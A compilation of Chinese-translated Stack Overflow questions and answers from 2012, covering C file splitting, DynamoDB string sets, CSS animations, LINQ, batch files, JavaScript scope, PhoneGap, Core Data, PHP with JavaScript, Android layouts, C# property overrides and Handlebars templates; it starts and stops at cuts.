        }

    // Split file
        off_t partSize = fileSize / part;
    // Last Part
        off_t lastPartSize = fileSize - partSize * part;
        unsigned long i;
        unsigned long j;
        // create part 1 to n-1
        for (j = 0; j < part; j++) {
            char partName[255];
            char *content;
            char partNumber[3];
            // Content of file part
    //      for (i = j; i < partSize * (j + 1); i++) {
    //
    //      }
            content = (char*) malloc(sizeof(char) * partSize);
            content = copychar(buffer, j + i, partSize + i);
            i += partSize;
            //copy name
            strcpy(partName, filename);
            // part Number
            sprintf(partNumber, "%d", j);
            // file name with .part1 2 3 4 ....
            strcat(partName, ".part");
            strcat(partName, partNumber);
            // Write to file
            writeFile(partName, content);
            free(content);
        }
    // last part
    char *content;
    content = (char*) malloc(sizeof(char) * (fileSize - partSize * (part - 1)));
    content = copychar(buffer, (part - 1) * partSize + 1, fileSize);
    char lastPartNumber[3];
    char lastPartName[255];
    sprintf(lastPartNumber, "%d", part);
    strcpy(lastPartName, filename);
    strcat(lastPartName, ".part");
    strcat(lastPartName, lastPartNumber);
    writeFile(lastPartName, content);
    free(content);

    free(buffer);
    fclose(fp);
    return 0;    
} 
```

这是从头到尾的函数copychar

```
char *copychar(char* buffer, unsigned long start, unsigned long end) {
    if (start >= end)
        return NULL;
    char *result;
    result = (char*) malloc(sizeof(char) * (end - start) + 1);
    unsigned long i;
    for (i = start; i <= end; i++)
        result[i] = buffer[i];
    result[end] = '\0';
    return result;
} 
```

这是获取文件大小的功能

```
off_t get_file_size(char *filename) {
    struct stat st;
    if (stat(filename, &st) == 0)
        return st.st_size;
    fprintf(stderr, "Cannot determine size of %s: %s\n", filename);
    return -1;
} 
```

这是写文件的功能

```
 int writeFile(char* filename, char*buffer) {
    if (buffer == NULL || filename == NULL)
        return 1;
    FILE *file;
    file = fopen(filename, "wb");
    fwrite(buffer, sizeof(char), sizeof(buffer) + 1, file);
    fclose(file);
    return 0;
} 
```

当我测试时，我使用文件测试 29MB 并且它被转储了。我调试它返回 fileSize true 但是当缓冲区中的 readfile 从文件中获取时它只返回 135 个字符并且当使用 copychar 时它出错。

```
 Breakpoint 1, 0x0000000000400a0b in copychar (buffer=0x7ffff5e3a010 "!<arch>\ndebian-binary   1342169369  0     0     100644  4         `\n2.0\ncontrol.tar.gz  1342169369  0     0     100644  4557      `\n\037\213\b", start=4154703576, end=4164450461) at final.c:43

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400a0b in copychar (buffer=0x7ffff5e3a010 "!<arch>\ndebian-binary   1342169369  0     0     100644  4         `\n2.0\ncontrol.tar.gz  1342169369  0     0     100644  4557      `\n\037\213\b", start=4154703576, end=4164450461) at final.c:43 
```

程序因信号 SIGSEGV、分段错误而终止。该程序不再存在。

我不知道如何在拆分时将缓冲区分成部分以写入部分。感谢提前！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T15:08:51.730

您可能已经注意到，将文件复制到 1 个大块中是非常不切实际的。这不是必需的。

在最简单的级别，您可以逐字节复制文件，如下所示

```
while( ( ch = fgetc(source) ) != EOF ) {
   fputc(ch, target);
} 
```

这会起作用，但它会很慢。最好在块中复制，如下所示：

```
 unsigned char buf[4096];
 size_t size;
 while( (size = fread(buf, 1, sizeof(buf), fpRead) ) > 0) {
     fwrite(buf, 1, size, fpWrite);
 } 
```

请注意，生成的代码更简单，并且不包含动态内存分配。

当然，您仍然需要添加拆分逻辑，但这可以通过跟踪写入的字节数并在实际写入之前打开一个新的写入文件来完成。

编辑：如何处理多部分方面 - 示意性地，您仍然需要对一些特殊情况和不同系统调用的测试结果进行额外检查

```
 unsigned char buf[4096];
 size_t size;
 size_t partsize = 100000; // asssuming you want to write 100k parts.
 size_t stilltobewritten = partsize; // bytes remaining to be written in current part
 size_t chunksize = sizeof(buf); // first time around we read full buffersize
 while( (size = fread(buf, 1, chunksize, fpRead) ) > 0) {
     fwrite(buf, 1, size, fpWrite);
     stilltobewritten -= size; // subtract bytes written from saldo
     if (stilltobewritten == 0) {
         // part is complete, close this part and open next
         fclose(fpWrite);
         fpWrite = fopen(nextpart,"wb");
         // and reinit variables
         stilltobewritten = partsize;
         chunksize = sizeof(buf);
     } else {
         // prep next round on present file - just the special case of the last block
         // to handle
         chunksize = (stilltobewritten > sizeof(buf)) ? sizeof(buf) : stilltobewritten;
     }
 } 
```

和编辑 2：文件部分名称也可以变得更简单：

```
 sprintf(partName, "%s.part%d",file, j); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T15:13:37.717

关于原始代码，copychar 中有一些`start`混淆`end`。首先，您的意思可能`sizeof(char) * (end - start + 1)`不是`sizeof(char) * (end - start) + 1`在 malloc 中，其次，您从原始缓冲区 ( `for (i = start; i <= end; i++)`) 复制 end-start+1 符号，然后用 覆盖最后一个符号`'\0'`，这可能不是预期的行为。

# amazon-dynamodb - dynamodb 创建字符串集

> ID：11702074
> 
> 赞同：5
> 
> 时间：2012-07-28T14:57:25.433
> 
> 标签：amazon-dynamodb

我有很多具有唯一 ID 的对象。每个对象都可以有多个与之关联的标签，如下所示：

```
123: ['a', 'hello']
456: ['dsajdaskldjs']
789: (no labels associated yet) 
```

我不打算将所有对象存储在 DynamoDB 中，只存储这些标签集。所以添加这样的标签是有意义的：

1.  查找具有 (id = required_id) 的记录
2.  如果有一个，并且它有一个名为 的集合`label_set`，则向该集合添加一个标签
3.  如果没有具有该 id 的记录，或者现有记录没有名为 的属性`label_set`，则创建一个记录和一个属性，并使用由标签组成的集合来初始化该属性

如果我使用一组数字，我可以只使用命令`ADD`操作。`UPDATE`这个命令完全符合我的描述。但是，这不适用于字符串集：

> 如果没有项目与指定的主键匹配：
> ADD - 使用提供的主键和属性值的数字（或数字集）创建项目。对字符串类型无效。

所以我必须使用set to的`PUT`操作，然后（以防失败）操作。这是两个操作，有点糟糕（因为您为每次操作付费，所以成本将是它们的 2 倍）。`Expected``{"label_set":{"Exists":false}}``ADD`

这种限制对我来说似乎很奇怪。为什么适用于数字集的东西不适用于字符串集？也许我做错了什么。

使用许多记录`(123, 'a'), (123, 'hello')`而不是每个对象的一个​​记录与一个集合不是一个解决方案：我想`get`一次从集合中获取所有值，而不需要任何扫描。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-10T02:07:20.287

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T21:27:15.600

您无法使用集合来做您想做的事，因为 Dynamo Db 不支持空集合。我建议只使用带有自定义模式的字符串并自己构建集合。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-19T23:09:45.103

也许你可以：（伪代码）

```
try:
    add_with_update_item(hash_key=42, "label")
except:
    element = new Element(hash_key=42, labels=["label"])
    element.save() 
```

使用这种优雅的恢复方法，一般情况下需要 1 次调用，否则需要 2 次。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-10-11T19:07:13.090

为避免两次操作，您可以向您的项目添加“ConditionExpression”。例如，将此字段/值添加到您的项目：

```
"ConditionExpression": "attribute_not_exists(RecordID) and attribute_not_exists(label_set)" 
```

[源文档。](http://docs.aws.amazon.com/amazondynamodb/latest/developerguide/Expressions.SpecifyingConditions.html)

编辑：我找到了一个关于如何使用条件语句的非常好的[指南](http://docs.aws.amazon.com/amazondynamodb/latest/gettingstartedguide/GettingStarted.JsShell.07.html)

# css - CSS3 动画适用于 Chrome 而不是 Firefox

> ID：11702077
> 
> 赞同：0
> 
> 时间：2012-07-28T14:57:35.613
> 
> 标签：css, css-animations

我无法弄清楚为什么这在 Chrome 中有效，但在 Firefox 中无效。

我的代码：

```
#header3{
    background: url(/images/mynecraft/clouds3.png) repeat-x center 20px;
    -webkit-animation-name:cloud-crawl-header3;
    -webkit-animation-duration: 120s;
    -webkit-animation-timing-function:linear;
    -webkit-animation-iteration-count:infinite;
    -moz-animation-name:cloud-crawl-header3;
    -moz-animation-duration:120s;
    -moz-animation-timing-function:linear;
    -moz-animation-iteration-count:infinite;
}
@-webkit-keyframes cloud-crawl-header3{
        from{background-position: -100% 20px, center top}to{background-position: 100% 20px, center top}
}
@-moz-keyframes cloud-crawl-header3{
        from{background-position: -100% 20px, center top}to{background-position: 100% 20px, center top}
} 
```

它有什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T15:37:15.410

为什么你有两组`background-position`这样的职位：`-100% 20px, center top`？

我认为应该是：

```
@-webkit-keyframes cloud-crawl-header3 {
    from {
        background-position: -100% 20px;
    }
    to { 
        background-position: 100% 20px;
    }
}

@-moz-keyframes cloud-crawl-header3 {
    from {
        background-position: -100% 20px;
    }
    to { 
        background-position: 100% 20px;
    }
} 
```

# c# - Linq对特定列的不同查询

> ID：11702082
> 
> 赞同：0
> 
> 时间：2012-07-28T14:57:59.490
> 
> 标签：c#, linq

> **可能重复：**
> [LINQ 选择不同的 c#](https://stackoverflow.com/questions/11673584/linq-select-distinct-c-sharp)

我正在尝试做这样的事情：

```
List<string> manufacturerFilters = new List<string>(){"Honda", "Ford", "Jaguar", "BMW"};
var products = (from p in context.Products
                where p.DeletedSince.Equals(null)
                && manufacturerFilters.Contains(p.Manufacturer.Name)
                && p.SomeValue == 123).Distinct(**p.Manufacturer**).Take(4); 
```

现在，这为我提供了属于我的过滤器列表中的 4 个制造商的产品列表。但我真正想要的是 4 种产品，每个制造商各 1 种。这就是为什么我把这个 Distinct 放在我的查询中，当然，这不起作用..

我应该如何做这种类型的不同查询？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T15:14:37.300

```
.Distinct(**p.Manufacturer.Name**) 
```

p.Manufacturer 是引用类型，因此它认为所有的都是不同的，因为它们有不同的引用。我希望这会有所帮助。如果您希望 .Distinct( **p.Manufacturer** ) 工作，那么您必须指定比较器。

# if-statement - 超级简单的错误，批量if语句

> ID：11702086
> 
> 赞同：0
> 
> 时间：2012-07-28T14:58:27.227
> 
> 标签：if-statement, batch-file

我的短批处理文件一直失败。我的 if 有什么问题？

```
:user
set /p usercommand = "Input: "

if %usercommand% equ "done"
echo got here!
goto end

else
echo not done
goto user 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T17:18:57.303

首先 - 与`set /p usercommand =`您设置名为`usercommand<space>`. 删除预期名称后的空格（因此变为`set /p usercommand=`）。

*也就是说，如果您的if else*语法不正确，您将遇到另一个错误。一定是：

```
if "%usercommand%" equ "done" (
 your commands here
) else (
 your commands here 
) 
```

请注意我引用`%usercommand%`的 . 否则，您的比较将永远不会正确（当然，除非您需要明确引用您的输入）

# javascript - 使用 SetTimout 的 Javascript 重定向不起作用

> ID：11702088
> 
> 赞同：1
> 
> 时间：2012-07-28T14:59:07.323
> 
> 标签：javascript, gps, scope

似乎无法让这个 javascript 重定向工作？建议？

我是否应该通过元刷新来做到这一点，以及如何做到这一点？

```
// If we have a successful location update
function onGeoSuccess(event)
{
    document.getElementById("Latitude").value =  event.coords.latitude; 
    document.getElementById("Longitude").value = event.coords.longitude;
    document.getElementById("location").href = "track.cfm?track=s&Lat=" + event.coords.latitude + "&Long=" + event.coords.longitude;

var redirectUrl = "track.cfm?track=s&Lat=" + event.coords.latitude + "&Long=" + event.coords.longitude; 

}

// If something has gone wrong with the geolocation request
function onGeoError(event)
{
    alert("Error code " + event.code + ". " + event.message);
}

function redirect() 
     { 
    window.location = redirectUrl; 
     } 
    setTimeout(redirect,15000); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T15:01:38.063

问题是变量的*范围。*`redirectUrl`您声明`redirectUrl`为`onGeoSuccess`函数的本地，因此它将*仅在它内部可见*。对于解决方法，你可以把所有这些东西：

```
function redirect() 
{ 
    window.location = redirectUrl; 
} 
setTimeout(redirect,15000); 
```

在`onGeoSuccess`函数内部，或使`redirectUrl`全局，通过删除`var`before `redirectUrl`：

```
 redirectUrl = "track.cfm?track=s&Lat="+...
//^-----no 'var' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T15:02:01.817

`redirectUrl`在父范围内声明，并运行`onGeoSuccess`函数。

```
var redirectUrl;

function onGeoSuccess (event) {
  document.getElementById("Latitude").value =  event.coords.latitude; 
  document.getElementById("Longitude").value = event.coords.longitude;
  document.getElementById("location").href = "track.cfm?track=s&Lat=" + event.coords.latitude + "&Long=" + event.coords.longitude;

  redirectUrl = "track.cfm?track=s&Lat=" + event.coords.latitude + "&Long=" + event.coords.longitude; 

}

function onGeoError (event) {
  alert("Error code " + event.code + ". " + event.message);
}

function redirect () { 
  window.location = redirectUrl; 
} 

onGeoSuccess(...);
setTimeout(redirect, 15000); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T15:02:06.030

两个问题：

1) 重定向 URL 是由一个函数设置的，至少从您发布的代码来看，该函数没有被调用

2）即使它被调用，`redirectUrl`也是该函数的局部变量，因此超时无法访问它。

始终检查错误控制台。

# java - android phonegap 插件 ActionBar 包装器

> ID：11702089
> 
> 赞同：5
> 
> 时间：2012-07-28T14:59:32.720
> 
> 标签：java, android, mobile, cordova, phonegap-plugins

我正在尝试使用 android 本机控件向我的 PhoneGap 应用程序添加 iOS“TabBar”样式导航 - 所以 ActionBar。我希望我的 JavaScript 在选项卡更改时接收回调，理想情况下，我希望 ActionBar 也完全由 JavaScript 动态填充（如 PhoneGap 中的 iOS Native TabBar）。我知道我可以在 JS/CSS/HTML 层中做到这一点，但在我这样做之前我想认真地使用本机控件。

通过修改 onCreate 以包含以下内容，我已成功将 ActionBar 添加到我的 android phonegap 应用程序中：

```
public void onCreate(Bundle savedInstanceState) {
    this.setBooleanProperty("showTitle", true);

    super.onCreate(savedInstanceState);

    getWindow().requestFeature(Window.FEATURE_ACTION_BAR);

    ActionBar bar = getActionBar();

    bar.setDisplayShowTitleEnabled(false); 
    bar.setDisplayShowHomeEnabled(false);
    bar.setNavigationMode(ActionBar.NAVIGATION_MODE_TABS);

    Tab tab = bar.newTab()
        .setText("Test")
        .setTabListener(new TestListener());

    bar.addTab(tab);
    bar.show();

    super.loadUrl("file:///android_asset/www/index.html");
} 
```

我一直在尝试通过围绕它创建一个插件来使它更漂亮，使用非常类似于 iOS NativeControls 机制：

```
public PluginResult execute(String action, JSONArray data, String callbackId) {
    PluginResult.Status status = PluginResult.Status.OK;
    String result = "";

    if(INIT.equals(action)) {
        ActionBar bar = cordova.getActivity().getActionBar();
        Tab tab = bar.newTab()
            .setText("Test")
            .setTabListener(new TestListener());

        // CRASHES HERE
        bar.addTab(tab);
        bar.show();
    }

    return new PluginResult(status, result);
} 
```

我知道这是一个非首发，因为必须在 onCreate 期间设置 ActionBar。因此，我将创建留在 onCreate 中，只是试图让 javascript 设置一个回调，以便在单击选项卡时被点击，但我不知道如何实际从 java 调用任意回调到 JavaScript -随时。我可以使用 keepCallback 函数通过“成功”回调来做到这一点。我需要它是一个回调，指定为java的参数，如下所示：

```
MyActionBar.prototype.setCallback = function(tabIndex, callback) {
    cordova.exec(function () {
            console.log("Set callback succeeded");
    },              
    function() {
            console.log("SetCallback failed");
    },              
    "MyActionBar",
    "setCallback", [tabIndex, callback // <--- Calls THIS callback on click
    ]);
}; 
```

所以几个问题：

1.  我正在使用的 ActionBar 策略是否可行/正确？
2.  是否可以动态更改 ActionBar 的内容以任意添加/删除项目？
3.  如何从我的 Java 插件调用由 JavaScript 指定的任意回调？

# ios - 我可以忽略有关太多属性的 Cora Data 警告吗？

> ID：11702094
> 
> 赞同：2
> 
> 时间：2012-07-28T15:00:29.893
> 
> 标签：ios, core-data, xcode4, compiler-warnings, datamodel

我在 iOS 应用程序中使用 Core Data（带有 sqlite），目前正在向实体添加一些新属性。我最多有大约 110 个属性。我意识到这很多，但是当我尝试以不同的方式组织数据时，我发现无法让我的应用程序可靠地运行。

Xcode 现在给我一个警告：“错误配置的实体：实体有 100 多个属性；考虑更浅的实体层次结构或非规范化属性。”

我不知道非规范化属性意味着什么，但假设我热衷于保持我的数据模型保持原样。我通常从不发布带有任何警告的代码。但是我可以安全地忽略这个警告吗，至少暂时直到我找到更好的方法来构建我的数据？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-29T17:16:00.367

您应该将类​​别移动到一个单独的实体，该实体由标题、技能水平、日期和注释组成。这是正确的方法，它将消除所有警告。你们的学生将与该类别具有一对多的关系——一个学生可能属于多个类别——就是这样。

# php - 在 window.location.href 中使用 php

> ID：11702095
> 
> 赞同：0
> 
> 时间：2012-07-28T15:00:38.573
> 
> 标签：php, javascript, window.location

这是我的 js 代码：

```
function check() {
    var delvar = "<? $_POST["del"]; ?>";
    var answer = confirm("Are you sure you want to delete the article?")
    if (answer) {
        window.location = "adm-site.php?del=" + delvar + "&delete=true";
    }
} 
```

现在，我的问题是它`delvar`不起作用。所以 url 只是`?del=&delete=true`, 而不是 eg`?del=testarticle&delete=true`

**编辑：**我`$_POST["del"]`是一个包含所有文章的选择标签，因此您将选择要删除
的 HTML 代码：

```
<select name="del">
    <option value="none" SELECTED></option>
    all articles echo'ed here by php
</select> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T15:15:13.147

我相信你想要这种情况：

*   用户获得一个页面，其中包含一个包含选择标签的表单，该标签将所有文章作为值/选项。
*   用户选择他/她想要删除的文章。
*   用户单击一个按钮。
*   然后你想将用户重定向到 URL `adm-site.php?del=02&delete=true`。

因此，在这种情况下，只有 JavaScript 会获取所选文章值的值并将其嵌入重定向 URL。所以，PHP 在这里什么也做不了。所有的动作都发生在客户端。

试试这个 HTML 代码：

```
<html>
<head>
<script language="JavaScript">
    function check(){
        var delvar=document.form1.del.options[document.form1.del.selectedIndex].value;
        //alert(delvar); //debug
        var answer = confirm("Are you sure you want to delete the article?")
        if (answer) {
            //alert("adm-site.php?del=" + delvar + "&delete=true");
            window.location = "adm-site.php?del=" + delvar + "&delete=true";
        }

    }
</script>
</head>
<body>
<form name="form1">
    <select name="del">
        <option value="none" SELECTED>None</option>
        <option value="01">Article 01</option>
        <option value="02">Article 02</option>
        <option value="03">Article 03</option>
    </select>
<input type="button" value="Delete This Article" onclick="check();">
</form>
</body>
</html> 
```

[JSFiddle.net 上](http://jsfiddle.net/xDX8U/1/)的现场演示（警告重定向 URL）

我编辑/更改的内容：

*   `form`为标签添加了名称。
*   更改了为 var`delvar`分配当前所选文章的值的方式。

否则，所有代码都与您的代码相同。

正如[Pheonix](https://stackoverflow.com/users/212218/phoenix)所提到的，一个有点安全的代码，做和上面一样的事情，但是使用 $_POST。您需要使用`$_POST` 数组而不是`$_GET`在您的`adm-site.php`.

```
<html>
<head>
<script language="JavaScript">
    function check(){
        var delvar = document.form1.del.options[document.form1.del.selectedIndex].value;
        var agree = confirm("Are you sure you want to delete Article " + delvar + " ?");
        if (agree)
            return true ;
        else
            return false ;
    } //function check() ENDS
</script>
</head>
<body>
<form name="form1" action="adm-site.php" method="POST">
    <select name="del">
        <option value="none" SELECTED>None</option>
        <option value="01">Article 01</option>
        <option value="02">Article 02</option>
        <option value="03">Article 03</option>
    </select>
    <input type="hidden" name="delete" value="true" />
    <input type="submit" name="submit" value="Delete this Article" onClick="return check();" />
</form>
</body>
</html> 
```

[JSFiddle.net 上的演示](http://jsfiddle.net/2urMx/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T15:05:49.037

```
var delvar = '<?php echo $_POST["del"]; ?>'; 
```

注意`<?php`而不是不鼓励的短代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T16:20:00.833

这是另一种思考方式：创建一个指向您要发送到的页面的链接，然后给它一个`onclick`这样的：

```
<a href="/adm-site.php?del=<?php echo $_POST['del']; ?>&delete=true" onclick="return confirm('Confirm Deletion?')" >Delete</a> 
```

这可行，但它可能不适合您的环境，具体取决于触发器`check()`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-28T15:43:11.150

您的 HTML 包含`"`因此您需要用单个撇号包围 PHP。如果您使用的是短标签，请正确使用它。所以最后，它应该是这样的：

```
var delvar = '<?= $_POST["del"]; ?>'; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-29T14:13:29.553

```
var delvar = "<? $_POST["del"]; ?>"; 
```

您正在尝试将 javascript 和 php 结合起来，但我们没有这种可能性，因为 javascript 是客户端脚本语言，PHP 是服务器端脚本语言。还有另一种结合javascript和php的方法。请参考[此链接](http://programmingbulls.com/how-generate-javascript-within-php-dynamically)。

# android - 在一个滚动视图中均匀分布 3 个视图

> ID：11702096
> 
> 赞同：2
> 
> 时间：2012-07-28T15:00:44.763
> 
> 标签：android, android-layout, layout, scrollview

我在滚动视图中有 3 个视图，我想将其分布在整个 scoll 布局中。我没有让它正常工作，希望有人看到这个问题。

我想要的是在滚动视图中：

```
<scrollview>
  <linear or relative view?>
    (filler)
    moneywheels
    (filler)
    timewheels
    timeWheelsText
    (filler)
  </linear or relative view?>
</scrollview> 
```

非常感谢您的帮助！

```
<ScrollView
    android:id="@+id/ScrollView"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:layout_weight="1" >

    <LinearLayout
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:gravity="center"
        android:orientation="vertical"
        android:weightSum="3" >

        <LinearLayout
            android:id="@+id/fil1"
            android:layout_width="fill_parent"
            android:layout_height="0dp"
            android:layout_weight="1" />

        <LinearLayout
            android:id="@+id/moneyWheels"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_weight="0">

            <!-- content -->

        </LinearLayout>

        <LinearLayout
            android:id="@+id/fill2"
            android:layout_width="fill_parent"
            android:layout_height="0dp"
            android:layout_weight="1" />

        <LinearLayout
            android:id="@+id/timeWheels"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_weight="0"
            android:background="@drawable/time"
            android:padding="@dimen/padding" >

            <!-- content -->

        </LinearLayout>

        <LinearLayout
            android:id="@+id/timeWheelsText"
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:layout_gravity="center"
            android:layout_weight="0"
            android:gravity="top|center" >

            <!-- content -->

        </LinearLayout>

        <LinearLayout
            android:id="@+id/fill3"
            android:layout_width="fill_parent"
            android:layout_height="0dp"
            android:layout_weight="1" />
    </LinearLayout>
</ScrollView>

<LinearLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:ads="http://schemas.android.com/apk/lib/com.google.ads"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:layout_weight="0"
    android:gravity="bottom|center_horizontal"
    android:orientation="vertical" >

    <com.google.ads.AdView
        android:id="@+id/adView"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        ads:adSize="BANNER"
        ads:adUnitId="xxxxxxxxxxx"
        ads:loadAdOnCreate="true"
        ads:testDevices="TEST_EMULATOR, TEST_DEVICE_ID" />
</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T15:23:26.563

您的布局 XML 文件无效。在处理 XML 时，您应该只拥有一个顶级标签。假设您希望广告显示在滚动视图下方，您需要以下内容：

```
<LinearLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:ads="http://schemas.android.com/apk/lib/com.google.ads"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:layout_weight="0"
    android:gravity="bottom|center_horizontal"
    android:orientation="vertical" >

    <ScrollView ...>
        <!-- Other pieces under scrollview go here -->
    </ScrollView>

    <com.google.ads.AdView
        android:id="@+id/adView"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        ads:adSize="BANNER"
        ads:adUnitId="xxxxxxxxxxx"
        ads:loadAdOnCreate="true"
        ads:testDevices="TEST_EMULATOR, TEST_DEVICE_ID" />
</LinearLayout> 
```

此外，对于您的垫片，我建议仅使用 Views，而不是 LinearLayouts。视图将是一个重量较轻的类，不会使用那么多资源。使用 LinearLayouts 作为间距也可能会引起其他意外。

# c# - 为什么覆盖文本框的 Text 属性会使 Visual Studio 崩溃？

> ID：11702098
> 
> 赞同：1
> 
> 时间：2012-07-28T15:01:06.397
> 
> 标签：c#, textbox, overriding

我试图创建一个新的控件，`TextBox`它`RialiTextBox`是一种货币文本框。

问题是，当我覆盖该`Text`属性，然后构建控件时，在窗体上拖动新创建的 TextBox 时，Visual Studio 崩溃。

我什至尝试了`new`关键字，但又一次出现“堆栈溢出错误”。我究竟做错了什么？

这是我正在谈论的代码片段：

```
public override string Text
{
    get
    {
        if (this.Text.Contains(" ريال")) {
            return this.Text.Replace(" ريال", "");
        }
        return base.Text;
    }
    set
    {
        base.Text = value;
    }
} 
```

更新：

我遵循了建议的解决方案，其中希望我将所有内容更改`this.Text`为`base.Text`. 这样做解决了 Visual Studio 崩溃和“堆栈溢出错误消息”，但我也注意到我覆盖的 onEnter 事件也停止运行！

当我完全注释掉新控件的重写 Text 属性时，该事件再次起作用！这是什么原因造成的？

```
protected override void OnEnter(EventArgs e)
    {
        if (Mode == Modes.ریالی)
        {
            if (this.Text.Contains(" ريال"))
            {
                this.Text = this.Text.Replace(" ريال", "");
            }
        }
        base.OnEnter(e);
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T15:06:17.927

你有一个无限循环。您的文本获取器正在获取自身。我认为您的意思是`base`在几个地方使用而不是`this`.

```
 public override string Text
    {
        get
        {
            if (base.Text.Contains(" ريال"))
            {
                return base.Text.Replace(" ريال", "");
            }
            return base.Text;
        }
        set
        {
            base.Text = value;
        }
    } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-28T15:06:31.577

在这些行中

```
 if (this.Text.Contains(" ريال")) 
            { 
                return this.Text.Replace(" ريال", ""); 
            } 
```

您请求覆盖的控件返回要替换的文本，以防它包含搜索到的字符串。但这会在无限循环中再次触发 GET 访问器。以 stackoverflow 异常结束

改成

```
 if (base.Text.Contains(" ريال")) 
            { 
                return base.Text.Replace(" ريال", ""); 
            } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-28T15:06:15.067

您正在创建一个无休止的递归

```
this.Text 
```

调用 getter，即 getter 在无限循环中调用自己！

更改`this.Text`为`base.Text`。`if`测试不是必需的。如果不包含该模式，该`Replace`方法无论如何都会返回原始文本。

```
public override string Text
{
    get { return base.Text.Replace(" ريال", ""); }
    set { base.Text = value; }
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-28T15:07:13.400

您需要在 Text 属性中使用局部变量。`Text`问题是您对property有递归调用`this.Text`，请`base.Text`改用。

例子：

```
public override string Text
        {
            get
            {
                string text = base.Text;
                if (text.Contains(" ريال"))
                {
                    return text.Replace(" ريال", "");
                }
                return base.Text;
            }
            set
            {
                base.Text = value;
            }
        } 
```

# ajax - 无法弄清楚 Handlebars.js 是否没有编译模板，或者是否还有其他一些我没有看到的错误

> ID：11702110
> 
> 赞同：1
> 
> 时间：2012-07-28T15:02:31.973
> 
> 标签：ajax, json, asp.net-mvc-4, asp.net-web-api, handlebars.js

所以我使用带有 web api 的 asp.net mvc4。我正在尝试通过 ajax 获取 api 数据并使用 handlebars.js 将其放入模板中（据我所知，它与 mustache.js 相同）。我的 javascript 中没有出现错误，使用 fiddle 我可以看到 json 结果返回，但没有呈现任何内容。您可以在 www.nerdlythings.com/webapplication/onus 查看实时页面。

所有代码都位于 cshtml 文件中，如下所示：

```
 @*Rendered HTML*@
<section id="master">
    <section id="ListOutPut"></section>
    <section id="right">
        <section id="DetailsOutput"></section>
        <section id="CreateOutput"></section>
    </section>
</section>

@*List View Template GET*@
<script id="list" type="text/html">
    <div id="onuses">
        <button id="createOnus">Create Onus</button>
        <ul>
            {{#each onus}}
            <li>
                <a>
                    <div class="onus" id="{{Id}}">
                        <p><span class="onusTitle">{{Title}}</span><span class="onusStatus"></span></p>
                        <p class="onusDescription"></p>
                    </div>
                </a>
            </li>
            {{/each}}
        </ul>
    </div>
</script>

@*Details Template GET(1)*@
<script id="Details" type="text/html">
    <section id="onusDetails" data-id="{{Id}}">
        <p><span class="onusTitle">{{Title}}</span><span class="onusStatus">{{Status}}</span></p>
        <p class="onusDescription">{{Description}}</p>
        <p class="onusDetails">{{Details}}</p>
        {{#if Recurring}}
                <section id="recurringDetails">
                    <p>{{R_Interval}}</p>
                    <p>{{R_StartDate}}</p>
                    <p>{{R_EndDate}}</p>
                </section>
        {{/if}}
            {{#if DateBased}}
                <section id="dateBased">
                    <p>{{D_DateDue}}</p>
                </section>
        {{/if}}
        <button class="editOnus">Edit</button>
        <button class="deleteOnus">Delete</button>
    </section>
</script>

@*Create/Update Template POST/PUT*@
<script id="Create" type="text/html">
    <section id="onusCreate" data-id="{{Id}}">
        <form>
        <input type="hidden" name="id" id="id" value="{{Id}}" />
        <p>
            <label for="title">Title:</label><input type="text" name="Title" id="title" required value="{{Title}}" />
        </p>
        <p>
            <label for="desc">Description:</label><input type="text" name="Description" id="desc" required value="{{Description}}" />
        </p>
        <p>
            <label for="details">Details:</label><input type="text" name="Details" id="details" required value="{{Details}}" />
        </p>
        <p>
            <input type="radio" name="type" value="{{Recurring}}" id="recurring" checked />Recurring Task
        </p>
        <p>
            <input type="radio" name="type" value="DateBased" checked />Date Based Task
        </p>
        <section id="onusType">
            <p>
                <label for="startDate">Start Date:</label><input type="date" value="{{R_StartDate}}" id="startDate" />
            </p>
            <p>
                <label for="endDate">Start Date:</label><input type="date" value="{{R_EndDate}}" id="endDate" />
            </p>
            <section id="intervalPicker">
                <label for="interval">Pick an Interval</label>
                <p>
                    <input type="radio" name="interval" value="0" checked />Daily
                </p>
                <p>
                    <input type="radio" name="interval" value="1" checked />Weekly
                </p>
                <p>
                    <input type="radio" name="interval" value="2" checked />Date
                </p>
                <p>
                    <input type="radio" name="interval" value="3" checked />Number of days
                </p>
            </section>
            <hr />
            <p>
